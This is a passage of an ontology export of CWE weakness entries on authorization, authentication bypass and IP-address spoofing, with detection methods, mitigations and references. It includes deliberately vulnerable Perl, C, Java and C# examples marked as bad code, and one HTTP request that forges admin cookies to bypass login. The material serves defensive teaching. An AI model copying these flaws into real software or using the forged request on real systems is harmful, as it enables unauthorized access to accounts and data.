The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory.

Example Language: Perl /* (bad code) */
sub DisplayPrivateMessage {
my($id) = @_;
my $Message = LookupMessageObject($id);
print \"From: \" . encodeHTML($Message->{from}) . \"<br>\\n\";
print \"Subject: \" . encodeHTML($Message->{subject}) . \"\\n\";
print \"<hr>\\n\";
print \"Body: \" . encodeHTML($Message->{body}) . \"\\n\";
}

my $q = new CGI;
# For purposes of this example, assume that CWE-309 and 

# CWE-523 do not apply. 
if (! AuthenticateUser($q->param('username'), $q->param('password'))) {
ExitError(\"invalid username or password\");
}

my $id = $q->param('id');
DisplayPrivateMessage($id);
While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users.

One way to avoid this problem would be to ensure that the \"to\" field in the message object matches the username of the authenticated user."^^xsd:string
                 
                 demonstrative_examples  "",
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Web Application Scanner
- Web Services Scanner
- Database Scanners
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis with Automated Results Interpretation"^^xsd:string
                 
                 dynamic  "automated",
     
     Annotations: rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Automated dynamic analysis may find many or all possible interfaces that do not require authorization, but manual analysis is required to determine if the lack of authorization violates business logic"^^xsd:string
                 
                 dynamic  "automated",
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Host Application Interface Scanner
- Fuzz Tester
- Framework-based Fuzzer
- Forced Path Execution
- Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis with Manual Results Interpretation"^^xsd:string
                 
                 dynamic  "manual",
     
     Annotations: rdfs:comment "A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a \"default deny\" policy when defining these ACLs."^^xsd:string
                 
                 installation  "",
     
     Annotations: rdfs:comment "An attacker could modify sensitive data, either by writing the data directly to a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to write the data."^^xsd:string
                 
                 integrity  "Modify Application Data",
     
     Annotations: rdfs:comment "An attacker could modify sensitive data, either by writing the data directly to a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to write the data."^^xsd:string
                 
                 integrity  "Modify Files or Directories",
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string
                 
                 static  "automated",
     
     Annotations: rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.
Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.
Effectiveness: Limited"^^xsd:string
                 
                 static  "automated",
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string
                 
                 static  "manual",
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Focused Manual Spotcheck - Focused manual analysis of source
- Manual Source Code Review (not inspections)
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string
                 
                 static  "manual",
     
     Annotations: rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Note: These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints."^^xsd:string, 
                 rdfs:comment "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.
Effectiveness: Moderate"^^xsd:string
                 
                 static  "manual",
     
     Annotations: rdfs:comment "Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a \"default deny\" policy when defining these ACLs."^^xsd:string
                 
                 system_configuration  "",
     technologies  "Database Server",
     technologies  "Web Server"
    
    
Individual: CWE-286_Incorrect_User_Management

    Annotations: 
        rdfs:comment "Maintenance
The relationships between privileges, permissions, and actors (e.g. users and groups) need further refinement within the Research view. One complication is that these concepts apply to two different pillars, related to control of resources (CWE-664) and protection mechanism failures (CWE-693)."^^xsd:string,
        rdfs:comment "Maintenance
This item needs more work. Possible sub-categories include: user in wrong group, and user with insecure profile or \"configuration\". It also might be better expressed as a category than a weakness."^^xsd:string,
        rdfs:comment "The software does not properly manage a user within its environment."^^xsd:string,
        rdfs:comment "Users can be assigned to the wrong group (class) of permissions resulting in unintended access rights to sensitive objects."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "286"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     other  "Varies by Context"^^xsd:string
    
    
Individual: CWE-287_Improper_Authentication

    Annotations: 
        rdfs:comment "AuthC:	
\"AuthC\" is typically used as an abbreviation of \"authentication\" within the web application security community. It is also distinct from \"AuthZ,\" which is an abbreviation of \"authorization.\" The use of \"Auth\" as an abbreviation is discouraged, since it could be used for either authentication or authorization."^^xsd:string,
        rdfs:comment "Relationship
This can be resultant from SQL injection vulnerabilities and other issues."^^xsd:string,
        rdfs:comment "When an actor claims to have a given identity, the software does not prove or insufficiently proves that the claim is correct."^^xsd:string,
        rdfs:comment "authentification:	
An alternate term is \"authentification\", which appears to be most commonly used by people from non-English-speaking countries."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     
     Annotations: rdfs:comment "CitrusDB 0.3.6 and earlier generates easily predictable MD5 hashes of the user name for the id_hash cookie, which allows remote attackers to bypass authentication and gain privileges by calculating the MD5 checksum of the user name combined with the \"boogaadeeboo\" string, which is hard-coded in the $hidden_hash variable."^^xsd:string
                 
                 references  CVE-2005-0408,
     references  CVE-2005-3435,
     references  CVE-2009-1048,
     references  CVE-2009-1596,
     references  CVE-2009-2168,
     references  CVE-2009-2213,
     references  CVE-2009-2382,
     references  CVE-2009-2422,
     references  CVE-2009-3107,
     references  CVE-2009-3231,
     references  CVE-2009-3232,
     references  CVE-2009-3421,
     
     Annotations: rdfs:comment "Authentication Abuse"^^xsd:string
                 
                 related_attack_patterns  CAPEC-114,
     
     Annotations: rdfs:comment "Authentication Bypass"^^xsd:string
                 
                 related_attack_patterns  CAPEC-115,
     
     Annotations: rdfs:comment "Identity Spoofing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-151,
     
     Annotations: rdfs:comment "Fake the Source of Data"^^xsd:string
                 
                 related_attack_patterns  CAPEC-194,
     
     Annotations: rdfs:comment "Exploiting Trust in Client."^^xsd:string
                 
                 related_attack_patterns  CAPEC-22,
     
     Annotations: rdfs:comment "Utilizing REST's Trust in the System Resource to Register Man in the Middle."^^xsd:string
                 
                 related_attack_patterns  CAPEC-57,
     
     Annotations: rdfs:comment "Session Hijacking."^^xsd:string
                 
                 related_attack_patterns  CAPEC-593,
     
     Annotations: rdfs:comment "Token Impersonation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-633,
     
     Annotations: rdfs:comment "Man in the Middle Attack."^^xsd:string
                 
                 related_attack_patterns  CAPEC-94,
     ID  "287"^^xsd:positiveInteger,
     access_control  "Execute Unauthorized Code or Commands"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks
Use an authentication framework or library such as the OWASP ESAPI Authentication feature."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Gain Privileges or Assume Identity"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string, 
                 rdfs:comment "This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force with a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.

Example 2 References:
[REF-236] Kim Zetter. \"Weak Password Brings 'Happiness' to Twitter Hacker\". 2009-01-09. <http://www.wired.com/threatlevel/2009/01/professed-twitt/>."^^xsd:string, 
                 rdfs:comment "The following code intends to ensure that the user is already logged in. If not, the code performs authentication with the user-provided username and password. If successful, it sets the loggedin and user cookies to \"remember\" that the user has already logged in. Finally, the code performs administrator tasks if the logged-in user has the \"Administrator\" username, as recorded in the user cookie.

(bad code)
Example Language: Perl 
my $q = new CGI;

if ($q->cookie('loggedin') ne \"true\") {
if (! AuthenticateUser($q->param('username'), $q->param('password'))) {
ExitError(\"Error: you need to log in first\");
}
else {
# Set loggedin and user cookies.
$q->cookie(
-name => 'loggedin',
-value => 'true'
);

$q->cookie(
-name => 'user',
-value => $q->param('username')
);
}
}

if ($q->cookie('user') eq \"Administrator\") {
DoAdministratorTasks();
}
Unfortunately, this code can be bypassed. The attacker can set the cookies independently so that the code does not check the username and password. The attacker could do this with an HTTP request containing headers such as:

(attack code)
 GET /cgi-bin/vulnerable.cgi HTTP/1.1
Cookie: user=Administrator
Cookie: loggedin=true

[body of request]
By setting the loggedin cookie to \"true\", the attacker bypasses the entire authentication check. By using the \"Administrator\" value in the user cookie, the attacker also gains privileges to administer the software."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Fuzz Tester
Framework-based Fuzzer"^^xsd:string, 
                 rdfs:comment "Analysis with Manual Results Interpretation"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 detection_methods  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Web Application Scanner
Web Services Scanner
Database Scanners
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Web Application Scanner
Web Services Scanner
Database Scanners
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis with Automated Results Interpretation"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Fuzz Tester
Framework-based Fuzzer"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Configuration Checker"^^xsd:string, 
                 rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Configuration Checker"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Source code Weakness Analyzer
- Context-configured Source Code Weakness Analyzer"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Source code Weakness Analyzer
- Context-configured Source Code Weakness Analyzer"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Automated Static Analysis

Automated static analysis is useful for detecting certain types of authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.
Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.
Effectiveness: Limited"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Manual Source Code Review (not inspections)"^^xsd:string, 
                 rdfs:comment "Analysis Source Code"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Manual Source Code Review (not inspections)"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
Manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.
Effectiveness: High

Note: These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
Manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.
Effectiveness: High

Note: These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-288_Authentication_Bypass_Using_an_Alternate_Path_or_Channel

    Annotations: 
        rdfs:comment "A product requires authentication, but the product has an alternate path or channel that does not require authentication."^^xsd:string,
        rdfs:comment "Relationship
overlaps Unprotected Alternate Channel"^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-1999-1077,
     references  CVE-1999-1454,
     references  CVE-2000-1179,
     references  CVE-2002-0066,
     references  CVE-2002-0870,
     references  CVE-2003-0304,
     references  CVE-2003-1035,
     related_attack_patterns  CAPEC-127,
     ID  "288"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Funnel all access through a single choke point to simplify how users can access a resource. For every access, perform a check to determine if the user has permissions to access the resource."^^xsd:string, 
                 rdfs:comment "This is often seen in web applications that assume that access to a particular CGI program can only be obtained through a \"front\" screen, when the supporting programs are directly accessible. But this problem is not just in web apps."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-289_Authentication_Bypass_by_Alternate_Name

    Annotations: 
        rdfs:comment "Relationship
Overlaps equivalent encodings, canonicalization, authorization, multiple trailing slash, trailing space, mixed case, and other equivalence issues."^^xsd:string,
        rdfs:comment "The software performs authentication based on the name of a resource being accessed, or the name of the actor performing the access, but it does not properly check all possible names for that resource or actor."^^xsd:string,
        rdfs:comment "Theoretical
Alternate names are useful in data driven manipulation attacks, not just for authentication."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2003-0317,
     references  CVE-2004-0847,
     ID  "289"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-290_Authentication_Bypass_by_Spoofing

    Annotations: 
        rdfs:comment "Relationship
This can be resultant from insufficient verification."^^xsd:string,
        rdfs:comment "This attack-focused weakness is caused by improperly implemented authentication schemes that are subject to spoofing attacks."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2009-1048,
     related_attack_patterns  CAPEC-21,
     related_attack_patterns  CAPEC-22,
     related_attack_patterns  CAPEC-459,
     related_attack_patterns  CAPEC-461,
     related_attack_patterns  CAPEC-473,
     related_attack_patterns  CAPEC-59,
     related_attack_patterns  CAPEC-60,
     related_attack_patterns  CAPEC-94,
     ID  "290"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string, 
                 rdfs:comment "This weakness can allow an attacker to access resources which are not otherwise accessible without proper authentication."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Both of these examples check if a request is from a trusted address before responding to the request.

(bad code)
Example Language: C 
sd = socket(AF_INET, SOCK_DGRAM, 0);
serv.sin_family = AF_INET;
serv.sin_addr.s_addr = htonl(INADDR_ANY);
servr.sin_port = htons(1008);
bind(sd, (struct sockaddr *) & serv, sizeof(serv));

while (1) {
memset(msg, 0x0, MAX_MSG);
clilen = sizeof(cli);
if (inet_ntoa(cli.sin_addr)==getTrustedAddress()) {
n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen);
}
}
(bad code)
Example Language: Java 
while(true) {
DatagramPacket rp=new DatagramPacket(rData,rData.length);
outSock.receive(rp);
String in = new String(p.getData(),0, rp.getLength());
InetAddress clientIPAddress = rp.getAddress();
int port = rp.getPort();

if (isTrustedAddress(clientIPAddress) & secretKey.equals(in)) {
out = secret.getBytes();
DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port); outSock.send(sp);
}
}
The code only verifies the address as stored in the request packet. An attacker can spoof this address, thus impersonating a trusted client"^^xsd:string, 
                 rdfs:comment "The following code authenticates users.

(bad code)
Example Language: Java 
String sourceIP = request.getRemoteAddr();
if (sourceIP != null && sourceIP.equals(APPROVED_IP)) {
authenticated = true;
}
The authentication mechanism implemented relies on an IP address for source validation. If an attacker is able to spoof the IP, they may be able to bypass the authentication mechanism."^^xsd:string, 
                 rdfs:comment "The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.

(bad code)
Example Language: C 
struct hostent *hp;struct in_addr myaddr;
char* tHost = \"trustme.example.com\";
myaddr.s_addr=inet_addr(ip_addr_string);

hp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET);
if (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) {
trusted = true;
} else {
trusted = false;
}
(bad code)
Example Language: Java 
String ip = request.getRemoteAddr();
InetAddress addr = InetAddress.getByName(ip);
if (addr.getCanonicalHostName().endsWith(\"trustme.com\")) {
trusted = true;
}
(bad code)
Example Language: C# 
IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);
IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);
if (hostInfo.HostName.EndsWith(\"trustme.com\")) {
trusted = true;
}
IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-291_Reliance_on_IP_Address_for_Authentication

    Annotations: 
        rdfs:comment "IP addresses can be easily spoofed. Attackers can forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication."^^xsd:string,
        rdfs:comment "The software uses an IP address for authentication."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     related_attack_patterns  CAPEC-4,
     ID  "291"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Use other means of identity verification that cannot be simply spoofed. Possibilities include a username/password or certificate."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "Malicious users can fake authentication information, impersonating any IP address."^^xsd:string, 
